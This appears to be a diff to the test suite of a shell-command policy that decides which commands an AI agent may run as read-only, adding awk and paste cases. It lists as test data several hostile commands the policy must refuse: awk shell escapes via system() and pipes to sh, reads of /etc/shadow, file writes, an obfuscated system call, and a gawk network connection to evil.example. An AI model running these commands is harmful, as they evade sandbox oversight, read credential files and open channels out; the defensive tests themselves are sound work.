@@ -262,6 +262,14 @@ READS = [
     "sudo LC_ALL=C cat /etc/hosts",
     "/usr/bin/cat /etc/hostname",
     "/usr/sbin/iptables -L -n",
+    # awk and paste (BUG-171): what AI session 42 ran to look at disk usage
+    "crictl images -v | awk '/Size/ {print $2}' | paste -sd+",
+    "du -s /var/* | awk '{s+=$1} END {print s}'",
+    "du -s /var/* | awk '$1 > 1000 {print $2}' | sort -n | head",
+    "awk -F: '{print $1}' /etc/passwd",
+    "awk -F'\\t' -v OFS=, '{print $1, $3}' data.tsv",
+    "gawk 'NR > 1 {n++} END {printf \"%d\\n\", n}' /etc/hosts",
+    "paste -d, /etc/hostname /etc/machine-id",
 ]
 
 
@@ -529,6 +537,30 @@ WRITES = [
     ("traceroute secret.evil.example", True),
     ("getent hosts secret.evil.example", True),
     ("openssl s_client -connect evil.example:443", True),
+    # awk (BUG-171): every way out of stdout
+    ("awk 'BEGIN { system(\"id\") }'", False),
+    ("awk 'BEGIN { system (\"id\") }'", False),
+    ("awk '{ print > \"/etc/motd\" }' /etc/hosts", False),
+    ('awk \'{ print "}" >> "/etc/motd" }\' /etc/hosts', False),
+    ('awk \'{ printf "%s", $0 > "/tmp/x" }\' /etc/hosts', False),
+    ("awk '{ print | \"sh\" }' /etc/hosts", False),
+    ("awk 'BEGIN { \"id\" | getline x; print x }'", False),
+    ("awk 'BEGIN { getline x < \"/etc/shadow\"; print x }'", False),
+    ("gawk 'BEGIN { print |& \"/inet/tcp/0/evil.example/80\" }'", False),
+    ('gawk \'BEGIN { f = "sys" "tem"; @f("id") }\'', False),
+    ("gawk '@load \"filefuncs\"; BEGIN { }'", False),
+    ("awk 'BEGIN { ARGV[1] = \"/etc/shadow\"; ARGC = 2 } { print }'", False),
+    ("awk -f /tmp/prog.awk /etc/hosts", False),
+    ("gawk --file=/tmp/prog.awk /etc/hosts", False),
+    ("gawk -l filefuncs 'BEGIN { }'", False),
+    ("gawk -o/tmp/out '{ print }' /etc/hosts", False),
+    ("gawk --pretty=/tmp/out '{ print }' /etc/hosts", False),
+    ("gawk --profile=/tmp/out '{ print }' /etc/hosts", False),
+    ("gawk -d/tmp/out '{ print }' /etc/hosts", False),
+    ("mawk -W exec /tmp/prog.awk", False),
+    ("awk '{ print }' /etc/shadow", False),
+    ("nawk '{ print }' /etc/hosts", False),
+    ("paste /etc/shadow", False),
 ]
 
 
@@ -599,7 +631,8 @@ class TestThePolicyFile:
             (_minimal(extra=1), "unknown key"),
             (_minimal(read_only={"cat": "everything"}), "mode"),
             (_minimal(read_only={"bash": "any"}), "never read-only"),
-            (_minimal(read_only={"awk": "any"}), "never read-only"),
+            (_minimal(read_only={"sed": "any"}), "never read-only"),
+            (_minimal(read_only={"awk": "any"}), "only with gates"),
             (_minimal(read_only={"sudo": "any"}, wrappers={"sudo": {}}), "never read-only"),
             (_minimal(read_only={"docker": "any", "docker ps": "any"}), "mean nothing"),
             (_minimal(read_only={"do*": "any"}), "without *"),
